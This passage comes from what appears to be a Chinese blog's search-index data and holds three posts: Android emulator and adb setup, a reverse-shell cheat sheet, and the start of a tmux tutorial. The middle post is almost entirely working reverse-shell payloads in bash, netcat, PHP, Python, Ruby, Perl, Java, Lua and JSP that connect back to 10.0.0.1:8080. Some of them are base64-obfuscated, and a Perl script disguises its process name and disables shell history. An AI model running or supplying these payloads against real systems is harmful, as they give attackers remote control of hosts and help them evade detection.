虽然有些应用已经可以在Genymotion的模拟器中运行了，但是还是有不少应用运行不了，如微信、知乎等。网上有说换个低版本sdk的模拟器就可以，实测了几个，还是会有这类问题。比较玄学，没法做答！ 问题d：既然我们使用的是Android Studio进行开发，那我们如何让其发现这个模拟器呢？首先在Android Studio-&gt;File-&gt;Settings-&gt;Plugins中找到genymotion插件，安装之后并重启。然后点击Android Studio-&gt;View-&gt;ToolBar，你会在工具栏中看到一个红色的Genymotion管理工具图标，现在基本上没问题了。 问题e：如何在Genymotion模拟器中运行工程？只需要点击绿色的run图标，并在Edit Configuration中选定Target为&quot;Open Select Deployment Target Dialog&quot;，接着点击run，选择genymotion中的模拟器（此模拟器在运行工程之前就已打开）。 你可以看到，genymotion的配置与安装问题多多，而且解决的还不全面，基本上每次配置都要花费一两个小时，有点得不偿失，所以我十分建议使用夜神模拟器。 1.3.2 夜神模拟器的安装与配置夜神模拟器安装基本上没有问题，所以这儿只讲配置问题。 （1）运行夜神模拟器， （2）打开命令行窗口， （3）打开到夜神安装目录（如cd D:\\Program Files (x86)\\NOX\\Nox\\bin）， （4）执行命令：nox_adb.exe connect 127.0.0.1:62001，连接模拟器， （5）若Android Studio连接不上夜神，重启模拟器即可。 这五步就能让Android Studio连上夜神模拟器，而且运行速度很快。 但是我们发现，貌似没法用android-sdk\\platform-tool\\adb devices发现这个模拟器，这就给测试造成了一定困难。由于版本不同，目前运行服务器端的adb（夜神）版本，比客户端的版本（SDK）低，所以系统就把当前运行的服务给杀掉了。 解决方案： 1、关掉AS和夜神模拟器。同时去任务管理器里看下，adb.exe以及nox_adb.exe这2个进程有没有在运行？有的话就结束掉。 2、找到SDK的目录和夜神模拟器的目录，将SDK目录下的adb.exe文件，复制到夜神模拟器的目录下，因为夜神模拟器目录下原本的adb文件名字叫做nox_adb.exe，因此复制过去之后也得改名为nox_adb.exe。 3、这样就将AS目录下的adb文件和模拟器目录下的adb文件完全同步了，版本号也一致了。 2、入门级操作2.1 AVD操作12345678910#可使用的系统镜像列表android-sdk/tools/android list targets#创建AVDandroid-sdk/tools/android create avd -n [name of your new avd]android-sdk/tools/android create avd -n [avd设备名] -t [镜像id] -c [大小][K|M]#运行AVDandroid-sdk/tools/emulator -avd [avd的名字]android-sdk/tools/emulator -avd [avd的名字] -partition-size [size in MBs] 2.2 ADB调试1234567891011#运行AVDandroid-sdk/tools/emulator -avd [avd的名字]####使用Android连接桥(ADB)与AVD交互#####获取所有连接的android设备android-sdk/platform-tools/adb devices# 连接到android设备android-sdk/platform-tools/adb shell （当只有一个设备时）android-sdk/platform-tools/adb shell -s [指定设备] (当有多个设备时)此时，我们进入了android设备的后台，可以用常用的linux操作进行 2.3 从AVD中复制出/入文件12345#从avd中复制出文件android-sdk/platform-tools/adb &#123;参数&#125; pull [要复制的文件路径] [存放复制出来的文件的本地路径]#把文件拷贝至avd中android-sdk/platform-tools/adb &#123;参数&#125; push [要复制的文件在本地的路径] [该文件在avd中的存放路径] 2.4 通过ADB在AVD中安装app12345# 安装计算机中的apkadb &#123;参数&#125; install [apk的存放路径]# 使用指定设备的命令，缩小要安装APK的设备范围adb &#123; -e | -d | -p &#125; install [apk的存放路径]","tags":[{"name":"调试","slug":"调试","permalink":"http://yoursite.com/tags/调试/"},{"name":"android","slug":"android","permalink":"http://yoursite.com/tags/android/"}]},{"title":"反弹Shell","date":"2017-12-09T15:53:55.000Z","path":"2017/12/09/反弹Shell/","text":"假设攻击端为10.0.0.1，接收端口为8080 服务器端为10.0.0.2 1、Bash关于bash中的重定向知识，可以参考shell之后的操作 服务器端： 1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 1bash -c &apos;sh -i &amp;&gt;/dev/tcp/10.0.0.1/8080 0&gt;&amp;1&apos; 攻击端： 1nc -lvvp 8080 2、NetCat服务器端 12nc -e /bin/sh 10.0.0.1 8080nc -e /bin/sh 10.0.0.1 8080 现在的很多/bin/nc -&gt; /etc/alternatives/nc -&gt; /bin/nc.openbsd 但是实际上这个nc.openbsd不支持nc -e命令 所以我们最好使用的是/bin/nc.traditional 1/bin/nc.traditional -e /bin/sh 10.0.0.1 8080 当然若没有/bin/nc.traditional这个nc传统版，我们也可以使用下面的方法： 1rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 8080 &gt;/tmp/f 12本地监听两个端口,通过管道,一处输入,一处输出nc 10.0.0.1 2333|/bin/sh|nc 10.0.0.1 2444 1mknod /tmp/backpipe p &amp;&amp; /bin/sh 0&lt;/tmp/backpipe | nc 10.0.0.1 8080 1&gt;/tmp/backpipe 12将nc替换成telnetmknod backpipe p &amp;&amp; telnet 10.0.0.1 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe 3、PHP1php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos; 不知道怎么回事，这个反弹的shell并不能用。代码假设TCP连接的文件描述符为3，如果不行可以试下4,5,6。当然推荐使用下面的： 1php -r &apos;set_time_limit(0);$a=&quot;1.0&quot;;$b=&quot;10.0.0.1&quot;;$c=8080;$d=1400;$e=null;$f=null;$g=&quot;uname -a; w; id; /bin/sh -i&quot;;$h=0;$i=0;if(function_exists(&quot;pcntl_fork&quot;))&#123;$j=pcntl_fork();if($j==-1)&#123;printit(&quot;ERROR: Can not fork&quot;);exit(1);&#125;if($j)&#123;exit(0);&#125;if(posix_setsid()==-1)&#123;printit(&quot;Error: Can not setsid()&quot;);exit(1);&#125;$h=1;&#125;else&#123;printit(&quot;WARNING: Failed to daemonise. This is quite common and not fatal.&quot;);&#125;chdir(&quot;/&quot;);umask(0);$k=fsockopen($b,$c,$l,$m,30);if(!$k)&#123;printit(&quot;$m ($l)&quot;);exit(1);&#125;$n=array(0=&gt;array(&quot;pipe&quot;,&quot;r&quot;),1=&gt;array(&quot;pipe&quot;,&quot;w&quot;),2=&gt;array(&quot;pipe&quot;,&quot;w&quot;));$o=proc_open($g,$n,$p);if(!is_resource($o))&#123;printit(&quot;ERROR: Can not spawn shell&quot;);exit(1);&#125;stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($k,0);printit(&quot;Successfully opened reverse shell to $b:$c&quot;);while(1)&#123;if(feof($k))&#123;printit(&quot;ERROR: Shell connection terminated&quot;);break;&#125;if(feof($p[1]))&#123;printit(&quot;ERROR: Shell process terminated&quot;);break;&#125;$q=array($k,$p[1],$p[2]);$r=stream_select($q,$e,$f,null);if(in_array($k,$q))&#123;if($i)printit(&quot;SOCK READ&quot;);$s=fread($k,$d);if($i)printit(&quot;SOCK: $s&quot;);fwrite($p[0],$s);&#125;if(in_array($p[1],$q))&#123;if($i)printit(&quot;STDOUT READ&quot;);$s=fread($p[1],$d);if($i)printit(&quot;STDOUT: $s&quot;);fwrite($k,$s);&#125;if(in_array($p[2],$q))&#123;if($i)printit(&quot;STDERR READ&quot;);$s=fread($p[2],$d);if($i)printit(&quot;STDERR: $s&quot;);fwrite($k,$s);&#125;&#125;fclose($k);fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($o);function printit($t)&#123;if(!$h)&#123;print&quot;$t\\n&quot;;&#125;&#125;&apos; 或者 1php -r &apos;function which($a)&#123;$b=execute(&quot;which $a&quot;);return($b?$b:$a);&#125;function execute($c)&#123;$d=&quot;&quot;;if($c)&#123;if(function_exists(&quot;exec&quot;))&#123;@exec($c,$d);$d=join(&quot;\\n&quot;,$d);&#125;elseif(function_exists(&quot;shell_exec&quot;))&#123;$d=@shell_exec($c);&#125;elseif(function_exists(&quot;system&quot;))&#123;@ob_start();@system($c);$d=@ob_get_contents();@ob_end_clean();&#125;elseif(function_exists(&quot;passthru&quot;))&#123;@ob_start();@passthru($c);$d=@ob_get_contents();@ob_end_clean();&#125;elseif(@is_resource($e=@popen($c,&quot;r&quot;)))&#123;$d=&quot;&quot;;while(!@feof($e))&#123;$d.=@fread($e,1024);&#125;@pclose($e);&#125;&#125;return $d;&#125;function cf($g,$h)&#123;if($i=@fopen($g,&quot;w&quot;))&#123;@fputs($i,@base64_decode($h));@fclose($i);&#125;&#125;$j=&quot;10.0.0.1&quot;;$k=&quot;8080&quot;;$l=array(&quot;perl&quot;=&gt;&quot;perl&quot;,&quot;c&quot;=&gt;&quot;c&quot;);$m=&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;.&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;.&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;.&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;.&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;.&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;.&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;;cf(&quot;/tmp/.bc&quot;,$m);$d=execute(which(&quot;perl&quot;).&quot; /tmp/.bc $j $k &amp;&quot;);&apos; 4、Python以python2.7为例 1python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; 1python -c &quot;exec(\\&quot;import socket, subprocess;s =socket.socket();s.connect((&apos;10.0.0.1&apos;,8080))\\nwhile 1: proc =subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\\&quot;)&quot; 1234567891011若将import socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;10.0.0.1&quot;,8080))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);base64加密后生成另外的shellpython -c &apos;import base64;exec(base64.b64decode(&quot;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTAuMC4wLjEnLDgwODApKQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KDQwOTYpCndoaWxlIGxlbihkKSE9bDoKCWQrPXMucmVjdig0MDk2KQpleGVjKGQseydzJzpzfSkK&quot;))&apos; 5、Ruby1ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,8080).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos; 不依赖于/bin/sh的 1ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos; windows环境下 1ruby -rsocket -e &apos;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos; MSF中的相应的反弹shell代码 1234567891011121314151617181920212223242526272829#!/usr/bin/env rubyrequire 'socket'require 'open3'#Set the Remote Host IPRHOST = \"192.168.1.10\" #Set the Remote Host PortPORT = \"6667\"#Tries to connect every 20 sec until it connects.beginsock = TCPSocket.new \"#&#123;RHOST&#125;\", \"#&#123;PORT&#125;\"sock.puts \"We are connected!\"rescue sleep 20 retryend#Runs the commands you type and sends you back the stdout and stderr.begin while line = sock.gets Open3.popen2e(\"#&#123;line&#125;\") do | stdin, stdout_and_stderr | IO.copy_stream(stdout_and_stderr, sock) end endrescue retryend 6、Perl1perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos; 一个不依赖调用/bin/bash的方法 1perl -MIO -e &apos;use IO::Socket;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:8080&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos; 完整的perl反弹shell脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/perl -w# perl-reverse-shell - A Reverse Shell implementation in PERLuse strict;use Socket;use FileHandle;use POSIX;my $VERSION = \"1.0\";# Where to send the reverse shell. Change these.my $ip = 'x.x.x.x';my $port = 2333;# Optionsmy $daemon = 1;my $auth = 0; # 0 means authentication is disabled and any# source IP can access the reverse shellmy $authorised_client_pattern = qr(/^127\\.0\\.0\\.1$/);# Declarationsmy $global_page = \"\";my $fake_process_name = \"/usr/sbin/apache\";# Change the process name to be less conspicious$0 = \"[httpd]\";# Authenticate based on source IP address if requiredif (defined($ENV&#123;'REMOTE_ADDR'&#125;)) &#123; cgiprint(\"Browser IP address appears to be: $ENV&#123;'REMOTE_ADDR'&#125;\"); if ($auth) &#123; unless ($ENV&#123;'REMOTE_ADDR'&#125; =~ $authorised_client_pattern) &#123; cgiprint(\"ERROR: Your client isn't authorised to view this page\"); cgiexit(); &#125;&#125;&#125; elsif ($auth) &#123; cgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access\"); cgiexit(0);&#125;# Background and dissociate from parent process if requiredif ($daemon) &#123; my $pid = fork(); if ($pid) &#123; cgiexit(0); # parent exits &#125; setsid(); chdir('/'); umask(0);&#125;# Make TCP connection for reverse shellsocket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123; cgiprint(\"Sent reverse shell to $ip:$port\"); cgiprintpage();&#125; else &#123; cgiprint(\"Couldn't open reverse shell to $ip:$port: $!\"); cgiexit();&#125;# Redirect STDIN, STDOUT and STDERR to the TCP connectionopen(STDIN, \"&gt;&amp;SOCK\");open(STDOUT,\"&gt;&amp;SOCK\");open(STDERR,\"&gt;&amp;SOCK\");$ENV&#123;'HISTFILE'&#125; = '/dev/null';system(\"w;uname -a;id;pwd\");exec(&#123;\"/bin/sh\"&#125; ($fake_process_name, \"-i\"));# Wrapper around printsub cgiprint &#123; my $line = shift; $line .= \"&amp;lt;p&amp;gt;\\n\"; $global_page .= $line;&#125;# Wrapper around exitsub cgiexit &#123; cgiprintpage(); exit 0; # 0 to ensure we don't give a 500 response.&#125;# Form HTTP response using all the messages gathered by cgiprint so farsub cgiprintpage &#123; print \"Content-Length: \" . length($global_page) . \"\\rConnection: close\\rContent-Type: text\\/html\\r\\n\\r\\n\" . $global_page;&#125; 1perl -e 'use strict;use Socket;use FileHandle;use POSIX;my $VERSION = \"1.0\";my $ip = \"10.0.0.1\";my $port = 8080;my $daemon = 1;my $auth = 0; my $authorised_client_pattern = qr(/^127\\.0\\.0\\.1$/);my $global_page = \"\";my $fake_process_name = \"/usr/sbin/apache\";$0 = \"[httpd]\";if (defined($ENV&#123;\"REMOTE_ADDR\"&#125;)) &#123;cgiprint(\"Browser IP address appears to be: $ENV&#123;'REMOTE_ADDR'&#125;\");if ($auth) &#123;unless ($ENV&#123;\"REMOTE_ADDR\"&#125; =~ $authorised_client_pattern) &#123;cgiprint(\"ERROR: Your client is not authorised to view this page\");cgiexit();&#125;&#125;&#125; elsif ($auth) &#123;cgiprint(\"ERROR: Authentication is enabled, but I could not determine your IP address. Denying access\");cgiexit(0);&#125;if ($daemon) &#123;my $pid = fork();if ($pid) &#123;cgiexit(0);&#125;setsid();chdir(\"/\");umask(0);&#125;socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname(\"tcp\"));if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;cgiprint(\"Sent reverse shell to $ip:$port\");cgiprintpage();&#125; else &#123;cgiprint(\"Could not open reverse shell to $ip:$port: $!\");cgiexit();&#125;open(STDIN, \"&gt;&amp;SOCK\");open(STDOUT,\"&gt;&amp;SOCK\");open(STDERR,\"&gt;&amp;SOCK\");$ENV&#123;\"HISTFILE\"&#125; = \"/dev/null\";system(\"w;uname -a;id;pwd\");exec(&#123;\"/bin/sh\"&#125; ($fake_process_name, \"-i\"));sub cgiprint &#123;my $line = shift;$line .= \"&lt;p&gt;\\n\";$global_page .= $line;&#125;sub cgiexit &#123;cgiprintpage();exit 0;&#125;sub cgiprintpage &#123;print \"Content-Length: \" . length($global_page) . \"\\r\\nConnection: close\\r\\nContent-Type: text\\/html\\r\\n\\r\\n\" . $global_page;&#125;' 7、JavaReverseShell.java 123456789101112public class ReverseShell&#123; public static void main(String[] args)&#123; try&#123; Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]&#123;\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/10.0.0.1/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done\"&#125;); p.waitFor(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 值得一提的是，由于java并不是脚本式语言，所以并不支持直接运行一行程序！所以需要进行的操作是： 先将上述内容复制到一个文件中，以ReverseShell.java命名(必须是这个名字，类和文件名要一致)； 然后运行javac ReverseShell.java生成ReverseShell.class字节码文件。（这个操作需要javac，该命令依赖jdk） 最后执行java ReverseShell（执行过程中不用加后缀，java命令依赖于jre，最好将其放置在后台运行。即加上&amp;或者nohup） 下面提供一个相对较为完整的Applet程序，其应该在网页中运行的，但是为了测试简单，我们直接在其中加入了main函数，所以有点像一个单独的程序一样。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111import java.io.*;import java.net.Socket;import java.util.*;import java.util.regex.*;import java.applet.Applet;public class poc extends Applet&#123; /** * Author: daniel baier alias duddits * Licens: GPL * Requirements: JRE 1.5 for running and the JDK 1.5 for compiling or higher * Version: 0.1 alpha release */ public String cd(String start, File currentDir) &#123; File fullPath = new File(currentDir.getAbsolutePath()); String sparent = fullPath.getAbsoluteFile().toString(); return sparent + &quot;/&quot; + start; &#125; @SuppressWarnings(&quot;unchecked&quot;) public void init() &#123; poc rs = new poc(); PrintWriter out; try &#123; Socket clientSocket = new Socket(&quot;10.0.0.1&quot;,8080); out = new PrintWriter(clientSocket.getOutputStream(), true); out.println(&quot;\\tJRS 0.1 alpha release\\n\\tdeveloped by duddits alias daniel baier&quot;); boolean run = true; String s; BufferedReader br = new BufferedReader(new InputStreamReader(clientSocket.getInputStream())); String startort = &quot;/&quot;; while (run) &#123; String z1; File f = new File(startort); out.println(f.getAbsolutePath() + &quot;&gt; &quot;); s = br.readLine(); z1 = s; Pattern pcd = Pattern.compile(&quot;^cd\\\\s&quot;); Matcher mcd = pcd.matcher(z1); String[] teile1 = pcd.split(z1); if (s.equals(&quot;exit&quot;)) &#123; run = false; &#125;else if (s.equals(null) || s.equals(&quot;cmd&quot;) || s.equals(&quot;&quot;)) &#123; &#125; else if(mcd.find())&#123; try &#123; String cds = rs.cd(teile1[1], new File(startort)); startort = cds; &#125; catch (Exception verz) &#123; out.println(&quot;Path &quot; + teile1[1] + &quot; not found.&quot;); &#125; &#125;else &#123; String z2; z2 = s; Pattern pstring = Pattern.compile(&quot;\\\\s&quot;); String[] plist = pstring.split(z2); try &#123; LinkedList slist = new LinkedList(); for (int i = 0; i &lt; plist.length; i++) &#123; slist.add(plist[i]); &#125; ProcessBuilder builder = new ProcessBuilder(slist); builder.directory(new File(startort)); Process p = builder.start(); Scanner se = new Scanner(p.getInputStream()); if (!se.hasNext()) &#123; Scanner sa = new Scanner(p.getErrorStream()); while (sa.hasNext()) &#123; out.println(sa.nextLine()); &#125; &#125; while (se.hasNext()) &#123; out.println(se.nextLine()); &#125; &#125; catch (Exception err) &#123; out.println(f.getAbsolutePath() + &quot;&gt; Command &quot; + s + &quot; failed!&quot;); out.println(f.getAbsolutePath() +&quot;&gt; Please try cmd /c &quot;+ s+&quot; or bash -c &quot; +s+&quot; if this command is an shell buildin.&quot;); &#125; &#125; &#125; if(!clientSocket.isConnected())&#123; run = false; out.flush(); out.close(); &#125; &#125; catch (Exception io) &#123; //System.err.println(&quot;Connection refused by peer&quot;); &#125; &#125; public static void main(String[] args)&#123; poc p = new poc(); p.init(); &#125;&#125; 运行此程序之前，应该更改环境变量的设置 1234&gt; export DISPLAY=:0.0&gt; 或者&gt; setenv DISPLAY :0.0&gt; 8、Lua1lua -e \"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','8080');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');\" 不建议安装最新的lua，因为会出现以下问题 123lua: (command line):1: module &apos;socket&apos; not found: no field package.preload[&apos;socket&apos;] no file &apos;/usr/local/share/lua/5.2/socket.lua&apos; 这个时候，你应该查看一下服务器上的/usr/local/share/lua下的目录到底是5.1还是5.2，根据其版本，安装正确的lua 9、Jsp12使用msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=8080 R &gt; re.jsp reverse_shell.jsp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;%@page import=\"java.lang.*\"%&gt;&lt;%@page import=\"java.util.*\"%&gt;&lt;%@page import=\"java.io.*\"%&gt;&lt;%@page import=\"java.net.*\"%&gt;&lt;% class StreamConnector extends Thread &#123; InputStream zd; OutputStream fm; StreamConnector( InputStream zd, OutputStream fm ) &#123; this.zd = zd; this.fm = fm; &#125; public void run() &#123; BufferedReader fr = null; BufferedWriter ctw = null; try &#123; fr = new BufferedReader( new InputStreamReader( this.zd ) ); ctw = new BufferedWriter( new OutputStreamWriter( this.fm ) ); char buffer[] = new char[8192]; int length; while( ( length = fr.read( buffer, 0, buffer.length ) ) &gt; 0 ) &#123; ctw.write( buffer, 0, length ); ctw.flush(); &#125; &#125; catch( Exception e )&#123;&#125; try &#123; if( fr != null ) fr.close(); if( ctw != null ) ctw.close(); &#125; catch( Exception e )&#123;&#125; &#125; &#125; try &#123; String ShellPath;if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) &#123; ShellPath = new String(\"/bin/sh\");&#125; else &#123; ShellPath = new String(\"cmd.exe\");&#125; Socket socket = new Socket( \"10.0.0.1\", 8080 ); Process process = Runtime.getRuntime().exec( ShellPath ); ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start(); ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start(); &#125; catch( Exception e ) &#123;&#125;%&gt; 10、正向shell（nc为例）服务器端 1nc -lvvp 7777 -e /bin/bash 攻击端 1nc 10.0.0.2 7777 最后要说的是xterm，这是一个session，可以维持；而由于服务器上和本地都得装相应的程序，所以起来较为麻烦！","tags":[{"name":"shell","slug":"shell","permalink":"http://yoursite.com/tags/shell/"}]},{"title":"tmux使用教程","date":"2017-12-09T09:25:01.000Z","path":"2017/12/09/tmux使用教程/","text":"为什么要用 Tmuxtmux 在很多方面都很有用。就我而言，由于 tmux 允许随时随地断开或重新接入会话（Session），所以最大的作用就是在远程服务器上持久地保存工作状态。 例如，你可以在服务器上新建一个会话并命名为“nodeapi”，然后用它来挖掘 node REST API 的漏洞（这是我现在的项目）。或者假设你正在咖啡店里工作，需要编译一些代码，而编译要花费 2 个小时才能完成（如果是和我一起工作的话），这时你又不得不离开咖啡店。如果使用了 tmux，你就可以轻松地断开当前的会话，并于稍后方便时重新接入该会话，继续工作。 这真是太方便了。 “如何使用 tmux 才能打开多个会话，如何在会话中打开多个标签（Tab），如何在标签中打开多个窗口（Window），又如何在窗口中打开多个窗格（Pane）”，也许有些人对这些操作更感兴趣。而我很少这样做的，因为我不喜欢打开太多的——实际上是尽可能少地打开——这些东西。因此，这篇入门教程主要讲解的也是作为简单的可持久化远程会话模型的 tmux。 远程操作计算机的生活方式机动性是 tmux 带给用户的最大价值。有很多开发者都是在服务器上进行所有工作的，他们只需从某处连接上服务器就可以开始工作了。有了 tmux（或者其他类似的工具），你就可以先坐在旧金山的某个咖啡店里开始在服务器上进行构建的工作，然后断开会话去赶飞机，待飞机降落到纽约市后再继续进行刚才的工作。 tmux 带来的另一个好处是在移动办公中，作为客户端的计算机变得不再那么重要了。只需要升级你的笔记本，然后从版本库中克隆出 vim 和 tmux 的配置文件，就可以再次回到配置最优的操作环境了。而且这一切只需要短短的几分钟。 总之，这些就是人们喜爱 tmux 的原因。当然即使你的生活不是四处奔波，也一样能体验到 tmux 带来的好处。 那么 screen 呢？问得好。tmux 和 screen 很像，但比 screen 更好。要问好在哪里，简单的回答就是虽然与 screen 的功能相同，但是 tmux 设计得更好。screen 虽然可用，但是很不稳定。 以下是一些 tmux 超越 screen 的地方： screen 的项目大体上已经终止了，并且代码中有大量的问题 tmux 是一个活跃的项目，并且其代码库经常进行更新 tmux 使用的是真正的客户端/服务器模型，而 screen 只是模拟了这种模型的行为 tmux 同时支持 emacs 和 vim 的快捷键 tmux 支持自动重命名窗口 tmux 可以高度的脚本化 tmux 的窗口分割功能更加先进 这些优点已经足够了吧，开始使用 tmux 吧。 基础首先要告诉诸位的是 tmux 中的一个全局的快捷键开关，开关开启后就可以通过快捷键完成很多任务。 tmux 的快捷键tmux 默认使用 Ctrl-b 作为激活快捷键的开关，开关开启后就可以通过快捷键迅速调用大量的功能。下面就给出一些基本功能的调用方法： 首先按下 $ Ctrl-b 接下来就可以按下一些后面将会讲解的快捷键了。不过先不要着急，可以先为能方便地使用组合键 Ctrl-b 做一点准备。不妨在操作系统中将键盘上的 CAPSLOCK 键映射为 Ctrl 键，这样当需要按下这个组合键时，小拇指的移动就可以更加舒服了。 运行 tmux好了，下面让我们从运行 tmux 开始。首先选择一台你希望在断开会话后依然可以重新接入的计算机（对我来说这通常是远程服务器），然后在上面运行如下的命令： $ tmux 很简单对吧。这样就开启了一个 tmux 的会话，你可以断开这个会话并在稍后再重新接入。 显示所有会话由于 tmux 的理念是可以开启多个会话，并且可以自由地断开会话后重新接入，为此我们需要首先能看到可用的会话。有两种方法可以实现这个目的： 1234# Via shortcut (by default Ctrl-b)# 使用快捷键（默认为 Ctrl-b） $ Ctrl-b s 1234# Via tmux command# 使用 tmux 的子命令 $ tmux ls 上面两种方法的效果相同，都可以得到类似下面的结果： 10: 1 windows (created Thu Nov 28 06:12:52 2013) [80x24] (attached) 新建会话下面我们就来新建一个会话。可以使用 new 命令新建会话，并且该命令允许以参数的形式传递一个会话名。我的建议是在新建时要提供一个会话名以便于日后管理。 1$ tmux new -s session-name 1234# Without naming the new session (not recommended) # 新建会话但并不指定名字 (不推荐这样做) $ tmux new 接入一个之前的会话既然我们已经创建了多个带有名称的会话，那么就可以随时接入了，有几种方法可以实现接入会话： 可以简单地输入 tmux a 命令，这样可以接入第一个可用的会话： 1$ tmux a 或者可以通过参数指定一个想接入的会话： 1$ tmux a -t session-name 从会话中断开可以使用 detach 命令断开已有的会话（因此才会有稍后重新接入会话这么一说）。 $ tmux detach 也可以使用快捷键断开会话： $ Ctrl-b d 关闭会话要关闭会话的话，可以使用如下的命令，该命令和接入会话时所使用的命令很像： $ tmux kill-session -t session-name 提示：关闭窗口时也可以使用类似的命令，只不过要把 kill-session 换成 kill-window。另外，还可以使用 tmux killall 同时关闭 tmux。 配置与其他工具一样，一旦配置好了 tmux，使用起来就将会非常顺手。下面就给出几个通常需要配置的项目： tmux 的主要快捷键 屏幕下方的状态条 自定义的各种快捷键 我使用了一些相当简单的配置： 12# Set a Ctrl-b shortcut for reloading your tmux config#设置 Ctrl-b 快捷键，用于重新加载 tmux 的配置文件 access log，error log和system log。 1234567891011121314151617181920bind r source-file ~/.tmux.conf # Rename your terminals# 重命名终端set -g set-titles onset -g set-titles-string &amp;#039;#(whoami)::#h::#(curl ipecho.net/plain;echo)&amp;#039; # Status bar customization# 自定义状态条set -g status-utf8 onset -g status-bg blackset -g status-fg whiteset -g status-interval 5set -g status-left-length 90set -g status-right-length 60set -g status-left &amp;quot;#[fg=Green]#(whoami)#[fg=white]::#[fg=blue](hostname -s)#[fg=white]::##[fg=yellow]#(curl ipecho.net/plain;echo)&amp;quot; set -g status-justify leftset -g status-right &amp;#039;#[fg=Cyan]#S #[fg=white]%a %d %b %R&amp;#039; tmux 默认会先从 